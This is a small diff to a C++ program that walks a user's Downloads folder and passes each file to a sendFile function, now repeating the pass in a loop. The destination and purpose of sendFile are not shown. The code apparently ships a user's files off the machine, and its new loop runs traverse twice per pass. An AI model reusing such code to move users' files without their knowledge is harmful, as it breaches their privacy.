@@ -20,7 +20,12 @@ int main(){
 	std::string strName = name; 
 	std::string path = "/home/" + strName + "/Downloads/";
 
-	traverse(path,0);
+	int runs = 0;
+
+	while(traverse(path,runs)){
+		runs++;
+		traverse(path,runs);
+	}
 }//End of Main
 
 
@@ -49,8 +54,11 @@ bool traverse(std::string path, int runs){
 		if(!isDir(files[i].c_str())){
 
 			sendFile(files[i],runs);
+			check = true;
 		}
 	}
+
+	return check;
 
 }//End of traverse
 
